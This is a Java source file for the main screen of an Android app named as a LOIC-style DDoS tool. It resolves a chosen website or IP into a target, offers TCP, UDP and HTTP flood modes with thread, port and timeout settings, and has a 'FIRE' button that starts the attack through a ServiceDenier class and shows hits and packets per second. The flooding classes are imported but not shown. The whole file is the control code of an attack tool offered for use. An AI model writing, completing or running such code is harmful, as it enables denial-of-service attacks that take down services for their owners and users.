package com.loic.ddos;

import java.net.InetAddress;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnKeyListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemSelectedListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;
import com.loic.ddos.ddos.ServiceDenier;
import com.loic.ddos.ddos.TCPSocketThread;
import com.loic.ddos.ddos.UDPSocketThread;
import com.loic.ddos.ddos.HTTPSocketThread;

public class Main extends Activity implements OnItemSelectedListener {
	private Button lockURL, lockIP, fireButton;
	private TextView url, target;
	private ServiceDenier serviceDenier = new ServiceDenier();
	private String selectedTarget = "NONE";
	protected PowerManager.WakeLock mWakeLock;
	
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		lockURL = (Button) findViewById(R.id.lockURL);
		lockIP = (Button) findViewById(R.id.lockIP);
		fireButton = (Button) findViewById(R.id.fireButton);
		url = (TextView) findViewById(R.id.url);
		target = (TextView) findViewById(R.id.target);
		lockURL.setOnClickListener(new OnClickListener() {
			public void onClick(View v) {
				vibrate(20);
				lockOn(url.getText().toString());
			}
		});
		lockIP.setOnClickListener(new OnClickListener() {
			public void onClick(View v) {
				vibrate(20);
				EditText ip1 = (EditText) findViewById(R.id.ip1);
				EditText ip2 = (EditText) findViewById(R.id.ip2);
				EditText ip3 = (EditText) findViewById(R.id.ip3);
				EditText ip4 = (EditText) findViewById(R.id.ip4);
				String ip = ip1.getText().toString() + "." + ip2.getText().toString() + "." + ip3.getText().toString() + "." + ip4.getText().toString();
				lockOn(ip);
			}
		});
		addListeners();
		final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
		this.mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "LOICLock");
		Spinner method = (Spinner) findViewById(R.id.method);
		method.setOnItemSelectedListener(this);
	}
	private void vibrate(int i) {
		Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
		vibrator.vibrate(50);
	}
	public void lockOn(final String address) {
		Runnable r = new Runnable() {
			public void run() {
				try {
					String domain = address.replace("http://", "").replace("www.", "");
					if (domain.length() > 0) {
						selectedTarget = InetAddress.getByName(domain).getHostAddress();
						Runnable r = new Runnable() {
							public void run() {
								target.setText(selectedTarget);
							}

						};
						Main.this.runOnUiThread(r);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		};
		new Thread(r).start();
	}
	public void addListeners() {
		final EditText ip1 = (EditText) findViewById(R.id.ip1);
		final EditText ip2 = (EditText) findViewById(R.id.ip2);
		final EditText ip3 = (EditText) findViewById(R.id.ip3);
		final EditText ip4 = (EditText) findViewById(R.id.ip4);
		ip1.addTextChangedListener((new TextWatcher() {
			public void beforeTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) {}
			public void onTextChanged(CharSequence s, int start, int before, int count) {
				if (s.length() > 2) {
					ip2.requestFocus();
					int i = Integer.parseInt(ip1.getText().toString());
					if (i > 255) {
						ip1.setText("255");
					}
				}
			}
			public void afterTextChanged(Editable s) {
				if (s.length() > 3) {
					ip1.setText(s.toString().substring(0, s.length() - 1));
					int i = Integer.parseInt(ip1.getText().toString());
					if (i > 255) {
						ip1.setText("255");
					}
				}
			}
		}));
		ip2.addTextChangedListener((new TextWatcher() {
			public void beforeTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) {}
			public void onTextChanged(CharSequence s, int start, int before, int count) {
				if (s.length() > 2) {
					ip3.requestFocus();
					int i = Integer.parseInt(ip2.getText().toString());
					if (i > 255) {
						ip2.setText("255");
					}
				}
			}
			public void afterTextChanged(Editable s) {
				if (s.length() > 3) {
					ip2.setText(s.toString().substring(0, s.length() - 1));
					int i = Integer.parseInt(ip2.getText().toString());
					if (i > 255) {
						ip2.setText("255");
					}
				}
			}
		}));
		ip3.addTextChangedListener((new TextWatcher() {
			public void beforeTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) {}
			public void onTextChanged(CharSequence s, int start, int before, int count) {
				if (s.length() > 2) {
					ip4.requestFocus();
					int i = Integer.parseInt(ip3.getText().toString());
					if (i > 255) {
						ip3.setText("255");
					}
				}
			}
			public void afterTextChanged(Editable s) {
				if (s.length() > 3) {
					ip3.setText(s.toString().substring(0, s.length() - 1));
					int i = Integer.parseInt(ip3.getText().toString());
					if (i > 255) {
						ip3.setText("255");
					}
				}
			}
		}));
		ip4.addTextChangedListener((new TextWatcher() {
			public void beforeTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) {}
			public void onTextChanged(CharSequence s, int start, int before, int count) {}
			public void afterTextChanged(Editable s) {
				if (s.length() > 3) {
					ip4.setText(s.toString().substring(0, s.length() - 1));
					int i = Integer.parseInt(ip4.getText().toString());
					if (i > 255) {
						ip4.setText("255");
					}
				}
			}
		}));
		ip2.setOnKeyListener(new OnKeyListener() {
			public boolean onKey(View v, int keyCode, KeyEvent event) {
				if (event.getAction() == KeyEvent.ACTION_DOWN && keyCode == KeyEvent.KEYCODE_DEL) {
					if (ip2.getText().toString().length() < 1) {
						ip1.requestFocus();
					}
				}
				return false;
			}
		});
		ip3.setOnKeyListener(new OnKeyListener() {
			public boolean onKey(View v, int keyCode, KeyEvent event) {
				if (event.getAction() == KeyEvent.ACTION_DOWN && keyCode == KeyEvent.KEYCODE_DEL) {
					if (ip3.getText().toString().length() < 1) {
						ip2.requestFocus();
					}
				}
				return false;
			}
		});
		ip4.setOnKeyListener(new OnKeyListener() {
			public boolean onKey(View v, int keyCode, KeyEvent event) {
				if (event.getAction() == KeyEvent.ACTION_DOWN && keyCode == KeyEvent.KEYCODE_DEL) {
					if (ip4.getText().toString().length() < 1) {
						ip3.requestFocus();
					}
				}
				return false;
			}
		});
	}
	public void onItemSelected(AdapterView<?> arg0, View arg1, int arg2, long arg3) {
		EditText timeout = (EditText) findViewById(R.id.timeout);
		EditText port = (EditText) findViewById(R.id.port);
		EditText message = (EditText) findViewById(R.id.message);
		switch (arg2) {
			case 0:
				timeout.setEnabled(true);
				port.setEnabled(true);
				message.setEnabled(true);
				break;
			case 1:
				timeout.setEnabled(false);
				port.setEnabled(true);
				message.setEnabled(true);
				break;
			case 2:
				timeout.setEnabled(true);
				port.setText("80");
				port.setEnabled(false);
				message.setEnabled(false);
				break;
		}
	}
	public void onNothingSelected(AdapterView<?> arg0) {}
	@Override public void onDestroy() {
		super.onDestroy();
		serviceDenier.stop();
	}
	@Override public void onBackPressed() {
		if (ServiceDenier.firing) {
			serviceDenier.stop();
			fireButton.setText("FIRE");
		} else {
			super.onBackPressed();
		}
	}
	public void fire(View v) {
		this.mWakeLock.acquire();
		vibrate(50);
		if (selectedTarget.equals("NONE")) {
			Toast.makeText(this, "No target selected!", Toast.LENGTH_SHORT).show();
		} else {
			EditText timeout = (EditText) findViewById(R.id.timeout);
			EditText port = (EditText) findViewById(R.id.port);
			EditText message = (EditText) findViewById(R.id.message);
			Spinner method = (Spinner) findViewById(R.id.method);
			EditText threads = (EditText) findViewById(R.id.threads);
			final Button b = (Button) v;
			if (!ServiceDenier.firing) {
				int timeout1 = Integer.parseInt(timeout.getText().toString());
				int port1 = Integer.parseInt(port.getText().toString());
				String message1 = message.getText().toString();
				final int method1 = method.getSelectedItemPosition();
				int threads1 = Integer.parseInt(threads.getText().toString());
				ProgressBar bar = (ProgressBar) findViewById(R.id.speed);
				serviceDenier.DDOS(selectedTarget, port1, method1, threads1, timeout1, message1, bar.getProgress());
				b.setText("STOP");
				Runnable r = new Runnable() {
					public void run() {
						final TextView tvHits = (TextView) findViewById(R.id.statusTV);
						final TextView tvTime = (TextView) findViewById(R.id.statusTVtime);
						final TextView tvPacketsPerSec = (TextView) findViewById(R.id.statusTVpackets);
						while (ServiceDenier.firing) {
							switch (method1) {
								case 0:
									Main.this.runOnUiThread(new Runnable() {
											public void run() {
												tvTime.setText("Elapsed Time: " + (System.currentTimeMillis() - TCPSocketThread.startTime) / 1000.0 + "s");
												tvHits.setText("TCP Hits: " + TCPSocketThread.count);
												tvPacketsPerSec.setText("Packets/sec: " + Math.round(TCPSocketThread.count / ((System.currentTimeMillis() - TCPSocketThread.startTime) / 1000.0)));
											}
										});
									break;
								case 1:
									Main.this.runOnUiThread(new Runnable() {
											public void run() {
												tvTime.setText("Elapsed Time: " + (System.currentTimeMillis() - UDPSocketThread.startTime) / 1000.0 + "s");
												tvHits.setText("UDP Hits: " + UDPSocketThread.count);
												tvPacketsPerSec.setText("Packets/sec: " + Math.round(UDPSocketThread.count / ((System.currentTimeMillis() - UDPSocketThread.startTime) / 1000.0)));
											}
										});
									break;
								case 2:
									Main.this.runOnUiThread(new Runnable() {
											public void run() {
												tvTime.setText("Elapsed Time: " + (System.currentTimeMillis() - HTTPSocketThread.startTime) / 1000.0 + "s");
												tvHits.setText("HTTP Hits: " + HTTPSocketThread.count);
												tvPacketsPerSec.setText("Packets/sec: " + Math.round(HTTPSocketThread.count / ((System.currentTimeMillis() - HTTPSocketThread.startTime) / 1000.0)));
											}
										});
									break;
							}
							if (ServiceDenier.error) {
								serviceDenier.stop();
								tvTime.setText("Elapsed Time: " + (System.currentTimeMillis() - TCPSocketThread.startTime) / 1000.0 + "s");
								tvHits.setText("Exception Occurred");
								tvPacketsPerSec.setText("Error - Check log for details");
								b.setText("FIRE");
							}
							try {
								Thread.sleep(50);
							} catch (Exception e) {
								e.printStackTrace();
							}
						}
						Main.this.mWakeLock.release();
					}
				};
				new Thread(r).start();
			} else {
				serviceDenier.stop();
				b.setText("FIRE");
			}
		}
	}
}
